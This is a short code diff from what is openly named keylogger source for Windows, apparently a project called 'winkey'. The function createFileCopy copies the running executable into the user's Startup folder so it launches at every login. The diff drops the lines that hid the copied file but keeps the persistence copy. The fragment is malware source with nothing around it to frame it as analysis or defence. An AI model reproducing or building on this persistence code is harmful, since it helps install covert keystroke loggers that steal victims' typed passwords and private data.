@@ -48,14 +48,5 @@ void createFileCopy()
 	GetModuleFileNameA(0, keyloggerPath, MAX_PATH);
 
 	std::string destPath = winkey_g.localAppData + "\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winkey.exe";
-
-	if (CopyFileA(keyloggerPath, destPath.c_str(), FALSE))
-	{
-		DWORD fileAttributes = GetFileAttributesA(destPath.c_str());
-		if (fileAttributes != INVALID_FILE_ATTRIBUTES)
-		{
-			fileAttributes |= FILE_ATTRIBUTE_HIDDEN;
-			SetFileAttributesA(destPath.c_str(), fileAttributes);
-		}
-	}
+	CopyFileA(keyloggerPath, destPath.c_str(), FALSE);
 }
